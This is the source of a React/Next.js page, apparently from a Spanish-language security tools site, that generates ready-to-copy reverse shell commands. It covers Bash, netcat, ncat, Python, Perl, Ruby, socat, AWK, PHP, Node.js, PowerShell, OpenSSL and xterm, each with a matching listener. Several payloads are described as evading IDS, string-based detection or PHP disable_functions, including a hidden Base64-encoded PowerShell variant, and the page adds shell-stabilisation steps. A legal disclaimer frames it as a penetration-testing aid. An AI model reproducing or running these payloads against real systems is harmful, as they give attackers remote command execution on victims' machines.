"use client";

import { useState, useCallback, useMemo } from "react";
import Link from "next/link";
import type { Route } from "next";
import { useToolAccess } from "@/hooks/useToolAccess";
import { ToolAccessBlocked } from "@/components/tools/ToolAccessBlocked";

const ACCENT = "#EF4444";

/**
 * REVERSE SHELL PAYLOAD GENERATOR
 * =================================
 * Generates ready-to-use reverse shell commands for authorized penetration
 * testing and security assessments. Educational purpose only.
 *
 * SECURITY ALIGNMENT (OWASP / NIST / MITRE ATT&CK 2026):
 * ─────────────────────────────────────────────────────────
 * • OWASP A09:2021 – Security Logging → Educational tool that helps
 *   security professionals understand attack vectors for better defense.
 * • NIST SP 800-115 – Technical Guide to Information Security Testing →
 *   Aligns with authorized penetration testing methodology.
 * • NIST SP 800-53 CA-8 – Penetration Testing → Supports authorized
 *   security assessments as prescribed by NIST controls.
 * • MITRE ATT&CK T1059 – Command and Scripting Interpreter → 
 *   Educational reference for understanding adversary techniques.
 * • MITRE ATT&CK T1071 – Application Layer Protocol →
 *   Demonstrates reverse connection techniques for defender awareness.
 * • MITRE CWE-20 – Input Validation → IP and port are strictly validated.
 *   Only valid IPv4/IPv6 addresses and port ranges 1-65535 accepted.
 * • No server-side processing — all payloads generated client-side.
 * • No actual connections made by the tool.
 * • Legal disclaimer prominently displayed.
 */

// SECURITY(CWE-20): Strict IP validation
function isValidIPv4(ip: string): boolean {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(part => {
        const num = parseInt(part, 10);
        return !isNaN(num) && num >= 0 && num <= 255 && part === String(num);
    });
}

function isValidIPv6(ip: string): boolean {
    // Simple IPv6 validation - handles most common formats
    const ipv6Regex = /^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$|^::$|^::1$|^([0-9a-fA-F]{1,4}:){1,7}:$|^([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}$|^([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}$|^([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}$|^([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}$|^([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}$|^[0-9a-fA-F]{1,4}:(:[0-9a-fA-F]{1,4}){1,6}$/;
    return ipv6Regex.test(ip);
}

function isValidIP(ip: string): boolean {
    return isValidIPv4(ip) || isValidIPv6(ip);
}

function isValidPort(port: string): boolean {
    const num = parseInt(port, 10);
    return !isNaN(num) && num >= 1 && num <= 65535 && port === String(num);
}

// SECURITY: Sanitize IP for use in shell commands - prevent command injection
function sanitizeForShell(input: string): string {
    // Only allow characters valid in IP addresses
    return input.replace(/[^0-9a-fA-F.:]/g, "");
}

interface ShellPayload {
    id: string;
    name: string;
    icon: string;
    category: "linux" | "windows" | "web" | "misc";
    description: string;
    generate: (ip: string, port: string) => string;
    listener?: (port: string) => string;
    notes?: string;
}

const PAYLOADS: ShellPayload[] = [
    // ===== LINUX SHELLS =====
    {
        id: "bash-tcp",
        name: "Bash TCP",
        icon: "🐧",
        category: "linux",
        description: "Shell reversa clásica usando /dev/tcp de Bash",
        generate: (ip, port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
        listener: (port) => `nc -lvnp ${port}`,
        notes: "Requiere que /dev/tcp esté habilitado en bash (no funciona en sh)",
    },
    {
        id: "bash-udp",
        name: "Bash UDP",
        icon: "🐧",
        category: "linux",
        description: "Shell reversa por UDP usando Bash",
        generate: (ip, port) => `bash -i >& /dev/udp/${ip}/${port} 0>&1`,
        listener: (port) => `nc -ulvnp ${port}`,
    },
    {
        id: "bash-196",
        name: "Bash 196",
        icon: "🐧",
        category: "linux",
        description: "Variante alternativa que evita detección de /dev/tcp",
        generate: (ip, port) => `0<&196;exec 196<>/dev/tcp/${ip}/${port}; bash <&196 >&196 2>&196`,
        listener: (port) => `nc -lvnp ${port}`,
    },
    {
        id: "nc-mkfifo",
        name: "Netcat (mkfifo)",
        icon: "🔌",
        category: "linux",
        description: "Netcat con named pipe — funciona con nc sin -e",
        generate: (ip, port) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ${ip} ${port} >/tmp/f`,
        listener: (port) => `nc -lvnp ${port}`,
    },
    {
        id: "nc-e",
        name: "Netcat -e",
        icon: "🔌",
        category: "linux",
        description: "Netcat clásico con opción -e (requiere nc-traditional)",
        generate: (ip, port) => `nc -e /bin/bash ${ip} ${port}`,
        listener: (port) => `nc -lvnp ${port}`,
        notes: "Requiere nc compilado con soporte -e (nc-traditional en Debian)",
    },
    {
        id: "ncat-ssl",
        name: "Ncat SSL",
        icon: "🔐",
        category: "linux",
        description: "Conexión cifrada con Ncat (parte de Nmap). Anti-IDS.",
        generate: (ip, port) => `ncat --ssl ${ip} ${port} -e /bin/bash`,
        listener: (port) => `ncat --ssl -lvnp ${port}`,
        notes: "Cifra el tráfico haciendo más difícil detectar la shell en la red",
    },
    {
        id: "python3",
        name: "Python 3",
        icon: "🐍",
        category: "linux",
        description: "Shell reversa interactiva en Python 3",
        generate: (ip, port) =>
            `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'`,
        listener: (port) => `nc -lvnp ${port}`,
    },
    {
        id: "python2",
        name: "Python 2",
        icon: "🐍",
        category: "linux",
        description: "Shell reversa en Python 2 (sistemas legacy)",
        generate: (ip, port) =>
            `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'`,
        listener: (port) => `nc -lvnp ${port}`,
    },
    {
        id: "perl",
        name: "Perl",
        icon: "🐪",
        category: "linux",
        description: "Shell reversa en Perl — disponible en muchos sistemas Unix",
        generate: (ip, port) =>
            `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'`,
        listener: (port) => `nc -lvnp ${port}`,
    },
    {
        id: "ruby",
        name: "Ruby",
        icon: "💎",
        category: "linux",
        description: "Shell reversa en Ruby",
        generate: (ip, port) =>
            `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'`,
        listener: (port) => `nc -lvnp ${port}`,
    },
    {
        id: "socat",
        name: "Socat",
        icon: "🔗",
        category: "linux",
        description: "Shell interactiva completa con TTY vía socat",
        generate: (ip, port) =>
            `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}`,
        listener: (port) =>
            `socat file:\`tty\`,raw,echo=0 tcp-listen:${port}`,
        notes: "Proporciona un TTY completo (flechas, tab, Ctrl+C funcionan)",
    },
    {
        id: "awk",
        name: "AWK",
        icon: "📝",
        category: "linux",
        description: "Using AWK for reverse shell — unusual and stealthy",
        generate: (ip, port) =>
            `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
        listener: (port) => `nc -lvnp ${port}`,
    },
    // ===== WEB SHELLS =====
    {
        id: "php-exec",
        name: "PHP exec",
        icon: "🐘",
        category: "web",
        description: "Shell reversa PHP usando exec() y mkfifo",
        generate: (ip, port) =>
            `php -r '$sock=fsockopen("${ip}",${port});exec("bash <&3 >&3 2>&3");'`,
        listener: (port) => `nc -lvnp ${port}`,
    },
    {
        id: "php-proc",
        name: "PHP proc_open",
        icon: "🐘",
        category: "web",
        description: "PHP con proc_open para bypass de disable_functions",
        generate: (ip, port) =>
            `php -r '$s=fsockopen("${ip}",${port});$proc=proc_open("bash",array(0=>$s,1=>$s,2=>$s),$pipes);'`,
        listener: (port) => `nc -lvnp ${port}`,
    },
    {
        id: "node-js",
        name: "Node.js",
        icon: "🟢",
        category: "web",
        description: "Shell reversa con Node.js child_process",
        generate: (ip, port) =>
            `node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("bash",[]);var client=new net.Socket();client.connect(${port},"${ip}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})()'`,
        listener: (port) => `nc -lvnp ${port}`,
    },
    // ===== WINDOWS SHELLS =====
    {
        id: "powershell",
        name: "PowerShell",
        icon: "🪟",
        category: "windows",
        description: "Shell reversa clásica en PowerShell",
        generate: (ip, port) =>
            `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
        listener: (port) => `nc -lvnp ${port}`,
    },
    {
        id: "powershell-b64",
        name: "PowerShell Base64",
        icon: "🪟",
        category: "windows",
        description: "PowerShell con payload codificado en Base64 para evasión",
        generate: (ip, port) => {
            const ps = `$client = New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
            // Encode to UTF-16LE Base64 (PowerShell -EncodedCommand format)
            const bytes: number[] = [];
            for (let i = 0; i < ps.length; i++) {
                bytes.push(ps.charCodeAt(i), 0);
            }
            const b64 = btoa(String.fromCharCode(...bytes));
            return `powershell -nop -w hidden -e ${b64}`;
        },
        listener: (port) => `nc -lvnp ${port}`,
        notes: "Codificado en Base64 UTF-16LE para bypass de detecciones basadas en strings",
    },
    // ===== MISCELLANEOUS =====
    {
        id: "xterm",
        name: "Xterm",
        icon: "🖥️",
        category: "misc",
        description: "Shell gráfica via X11 forwarding",
        generate: (ip, _port) => `xterm -display ${ip}:1`,
        listener: () => `Xnest :1\nxhost +targetip`,
        notes: "Requiere que el servidor X esté escuchando (xhost +)",
    },
    {
        id: "openssl",
        name: "OpenSSL",
        icon: "🔐",
        category: "misc",
        description: "Shell reversa cifrada via OpenSSL — evade IDS/IPS",
        generate: (ip, port) =>
            `mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${ip}:${port} > /tmp/s; rm /tmp/s`,
        listener: (port) =>
            `openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port ${port}`,
        notes: "Tráfico completamente cifrado con TLS",
    },
];

const CATEGORIES = [
    { id: "linux" as const, name: "Linux/Unix", icon: "🐧" },
    { id: "windows" as const, name: "Windows", icon: "🪟" },
    { id: "web" as const, name: "Web/Scripting", icon: "🌐" },
    { id: "misc" as const, name: "Otros", icon: "🔧" },
];

export default function ReverseShellPage() {
    const { isLoading, isAuthorized, accessType, toolName } = useToolAccess("reverse-shell");
    const [ip, setIp] = useState("");
    const [port, setPort] = useState("4444");
    const [selectedCategory, setSelectedCategory] = useState<string | null>(null);
    const [copiedId, setCopiedId] = useState<string | null>(null);
    const [searchQuery, setSearchQuery] = useState("");
    const [showListeners, setShowListeners] = useState(true);

    // SECURITY(CWE-20): Sanitize inputs
    const sanitizedIp = sanitizeForShell(ip);
    const sanitizedPort = port.replace(/[^0-9]/g, "");

    const isValid = isValidIP(sanitizedIp) && isValidPort(sanitizedPort);

    const filteredPayloads = useMemo(() => {
        let result = PAYLOADS;
        if (selectedCategory) {
            result = result.filter(p => p.category === selectedCategory);
        }
        if (searchQuery.trim()) {
            const q = searchQuery.toLowerCase();
            result = result.filter(p =>
                p.name.toLowerCase().includes(q) ||
                p.description.toLowerCase().includes(q)
            );
        }
        return result;
    }, [selectedCategory, searchQuery]);

    const handleCopy = useCallback(async (text: string, id: string) => {
        await navigator.clipboard.writeText(text);
        setCopiedId(id);
        setTimeout(() => setCopiedId(null), 2000);
    }, []);

    if (isLoading) {
        return (
            <div className="min-h-screen bg-[#0F1724] flex items-center justify-center">
                <div className="w-8 h-8 border-2 border-accent-1 border-t-transparent rounded-full animate-spin" />
            </div>
        );
    }

    if (!isAuthorized) {
        return <ToolAccessBlocked accessType={accessType} toolName={toolName || "Generador de Reverse Shells"} />;
    }

    return (
        <div className="min-h-screen bg-gradient-to-br from-[#0F1724] via-[#1E293B] to-[#0F1724]">
            <main className="max-w-4xl mx-auto px-4 sm:px-6 pt-20 pb-12 sm:pt-24 sm:pb-16">
                <div className="text-center mb-6">
                    <h1 className="text-2xl sm:text-3xl font-bold text-white mb-2">
                        Generador de Reverse Shells
                    </h1>
                    <p className="text-neutral-400 text-sm sm:text-base">
                        Genera payloads de shell reversa para pruebas de penetración autorizadas
                    </p>
                </div>

                {/* Legal Disclaimer */}
                <div className="mb-6 bg-red-500/10 border border-red-500/30 rounded-xl p-4">
                    <p className="text-xs text-red-300">
                        <strong>⚠️ AVISO LEGAL (NIST SP 800-115):</strong> Esta herramienta es exclusivamente para{" "}
                        <strong>pruebas de seguridad autorizadas</strong> y fines educativos. El uso no autorizado
                        de estas técnicas contra sistemas sin consentimiento explícito es <strong>ilegal</strong> y
                        puede constituir un delito penal. Asegúrate de tener autorización escrita antes de realizar
                        cualquier prueba de penetración. El autor no se hace responsable del mal uso de esta herramienta.
                    </p>
                </div>

                {/* IP and Port Inputs */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
                    <div className="bg-white/5 rounded-xl p-4 border border-white/10">
                        <label className="block">
                            <span className="text-sm font-medium text-white mb-2 block">
                                Tu IP (LHOST)
                            </span>
                            <input
                                type="text"
                                value={ip}
                                onChange={e => setIp(e.target.value)}
                                placeholder="10.10.14.5"
                                className="w-full bg-[#0F1724] border border-white/10 rounded-lg px-4 py-3 text-sm text-white font-mono outline-none focus:ring-2"
                                style={{ "--tw-ring-color": ACCENT } as React.CSSProperties}
                                spellCheck={false}
                                maxLength={45} // Max IPv6 length
                            />
                            {ip && !isValidIP(sanitizedIp) && (
                                <p className="text-xs text-red-400 mt-1">IP no válida</p>
                            )}
                        </label>
                    </div>
                    <div className="bg-white/5 rounded-xl p-4 border border-white/10">
                        <label className="block">
                            <span className="text-sm font-medium text-white mb-2 block">
                                Puerto (LPORT)
                            </span>
                            <input
                                type="text"
                                value={port}
                                onChange={e => setPort(e.target.value)}
                                placeholder="4444"
                                className="w-full bg-[#0F1724] border border-white/10 rounded-lg px-4 py-3 text-sm text-white font-mono outline-none focus:ring-2"
                                style={{ "--tw-ring-color": ACCENT } as React.CSSProperties}
                                spellCheck={false}
                                maxLength={5}
                            />
                            {port && !isValidPort(sanitizedPort) && (
                                <p className="text-xs text-red-400 mt-1">Puerto 1-65535</p>
                            )}
                        </label>
                    </div>
                </div>

                {/* Quick Options */}
                <div className="flex flex-wrap items-center gap-3 mb-6">
                    <label className="inline-flex items-center gap-2 text-sm text-neutral-400 cursor-pointer">
                        <input
                            type="checkbox"
                            checked={showListeners}
                            onChange={e => setShowListeners(e.target.checked)}
                            className="rounded bg-white/10 border-white/20 text-red-500 focus:ring-red-500"
                        />
                        Mostrar listener
                    </label>
                    <div className="flex-1" />
                    <div className="relative">
                        <input
                            type="text"
                            value={searchQuery}
                            onChange={e => setSearchQuery(e.target.value)}
                            placeholder="Buscar..."
                            className="w-40 bg-white/5 border border-white/10 rounded-lg px-3 py-1.5 text-sm text-white outline-none focus:ring-1"
                            style={{ "--tw-ring-color": ACCENT } as React.CSSProperties}
                        />
                    </div>
                </div>

                {/* Category Tabs */}
                <div className="flex flex-wrap gap-2 mb-6">
                    <button
                        onClick={() => setSelectedCategory(null)}
                        className={`px-3 py-1.5 rounded-lg text-sm font-medium transition-all ${!selectedCategory ? "bg-red-500/20 text-red-300 border border-red-500/30" : "bg-white/5 text-neutral-400 border border-transparent hover:bg-white/10"}`}
                    >
                        Todas ({PAYLOADS.length})
                    </button>
                    {CATEGORIES.map(cat => {
                        const count = PAYLOADS.filter(p => p.category === cat.id).length;
                        return (
                            <button
                                key={cat.id}
                                onClick={() => setSelectedCategory(selectedCategory === cat.id ? null : cat.id)}
                                className={`px-3 py-1.5 rounded-lg text-sm font-medium transition-all ${selectedCategory === cat.id ? "bg-red-500/20 text-red-300 border border-red-500/30" : "bg-white/5 text-neutral-400 border border-transparent hover:bg-white/10"}`}
                            >
                                {cat.icon} {cat.name} ({count})
                            </button>
                        );
                    })}
                </div>

                {/* Payloads List */}
                <div className="space-y-3">
                    {filteredPayloads.map(payload => {
                        const generated = isValid ? payload.generate(sanitizedIp, sanitizedPort) : "";
                        const listener = isValid && payload.listener ? payload.listener(sanitizedPort) : "";

                        return (
                            <div key={payload.id} className="bg-white/5 rounded-xl border border-white/10 overflow-hidden">
                                <div className="p-4">
                                    <div className="flex items-center justify-between mb-2">
                                        <div className="flex items-center gap-2">
                                            <span className="text-lg">{payload.icon}</span>
                                            <h3 className="text-sm font-semibold text-white">{payload.name}</h3>
                                        </div>
                                        {isValid && (
                                            <button
                                                onClick={() => handleCopy(generated, payload.id)}
                                                className="px-3 py-1 rounded-md text-xs font-medium text-white transition-colors"
                                                style={{ background: `${ACCENT}30` }}
                                            >
                                                {copiedId === payload.id ? "✓ Copiado" : "Copiar"}
                                            </button>
                                        )}
                                    </div>
                                    <p className="text-xs text-neutral-500 mb-3">{payload.description}</p>

                                    {isValid ? (
                                        <>
                                            <div className="bg-[#0F1724] rounded-lg p-3 overflow-x-auto">
                                                <code className="text-xs text-green-400 whitespace-pre-wrap break-all font-mono">
                                                    {generated}
                                                </code>
                                            </div>

                                            {showListeners && listener && (
                                                <div className="mt-2">
                                                    <span className="text-[10px] text-neutral-500 uppercase tracking-wider">Listener:</span>
                                                    <div className="bg-[#0F1724] rounded-lg p-3 mt-1 flex items-center justify-between gap-2">
                                                        <code className="text-xs text-blue-400 whitespace-pre-wrap break-all font-mono">
                                                            {listener}
                                                        </code>
                                                        <button
                                                            onClick={() => handleCopy(listener, `${payload.id}-listener`)}
                                                            className="text-xs text-neutral-500 hover:text-white transition-colors shrink-0"
                                                        >
                                                            {copiedId === `${payload.id}-listener` ? "✓" : "📋"}
                                                        </button>
                                                    </div>
                                                </div>
                                            )}

                                            {payload.notes && (
                                                <p className="text-[10px] text-neutral-500 mt-2 italic">
                                                    💡 {payload.notes}
                                                </p>
                                            )}
                                        </>
                                    ) : (
                                        <div className="bg-[#0F1724] rounded-lg p-3 text-center">
                                            <span className="text-xs text-neutral-500">
                                                Introduce una IP y puerto válidos para generar el payload
                                            </span>
                                        </div>
                                    )}
                                </div>
                            </div>
                        );
                    })}
                </div>

                {filteredPayloads.length === 0 && (
                    <div className="text-center py-12">
                        <p className="text-neutral-500">No se encontraron payloads para esa búsqueda.</p>
                    </div>
                )}

                {/* Stabilize Shell Tips */}
                <div className="mt-8 bg-white/5 rounded-xl p-4 border border-white/10">
                    <h3 className="text-sm font-semibold text-white mb-3">🔧 Estabilizar la Shell</h3>
                    <div className="space-y-2 text-xs text-neutral-400 font-mono">
                        <div className="bg-[#0F1724] rounded-lg p-3">
                            <p className="text-neutral-500 mb-1"># Paso 1: Spawnar TTY con Python</p>
                            <code className="text-green-400">python3 -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;</code>
                        </div>
                        <div className="bg-[#0F1724] rounded-lg p-3">
                            <p className="text-neutral-500 mb-1"># Paso 2: Background + configurar terminal</p>
                            <code className="text-green-400">Ctrl+Z<br />stty raw -echo; fg</code>
                        </div>
                        <div className="bg-[#0F1724] rounded-lg p-3">
                            <p className="text-neutral-500 mb-1"># Paso 3: Variables de entorno</p>
                            <code className="text-green-400">export TERM=xterm-256color<br />export SHELL=bash</code>
                        </div>
                    </div>
                </div>

                {/* MITRE ATT&CK Reference */}
                <div className="mt-4 bg-white/5 rounded-xl p-4 border border-white/10">
                    <h3 className="text-sm font-semibold text-white mb-2">📚 Referencias MITRE ATT&CK</h3>
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-xs text-neutral-400">
                        <div className="p-2 bg-white/5 rounded-lg">
                            <strong className="text-white">T1059</strong> — Command and Scripting Interpreter
                        </div>
                        <div className="p-2 bg-white/5 rounded-lg">
                            <strong className="text-white">T1071</strong> — Application Layer Protocol
                        </div>
                        <div className="p-2 bg-white/5 rounded-lg">
                            <strong className="text-white">T1573</strong> — Encrypted Channel
                        </div>
                        <div className="p-2 bg-white/5 rounded-lg">
                            <strong className="text-white">T1095</strong> — Non-Application Layer Protocol
                        </div>
                    </div>
                </div>

                {/* Security Notice */}
                <div className="mt-4 bg-red-500/10 border border-red-500/30 rounded-xl p-3">
                    <p className="text-xs text-red-300">
                        <strong>🛡️ Seguridad (NIST SP 800-115 / OWASP):</strong> Los payloads se generan
                        localmente en tu navegador. No se realizan conexiones de red. Los inputs se validan
                        y sanitizan estrictamente. Solo usar en entornos con autorización escrita.
                    </p>
                </div>

                <div className="mt-8 text-center">
                    <Link href={"/herramientas" as Route} className="inline-flex items-center gap-2 text-sm text-neutral-400 hover:text-white transition-colors">
                        <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" />
                        </svg>
                        Volver a herramientas
                    </Link>
                </div>
            </main>
        </div>
    );
}
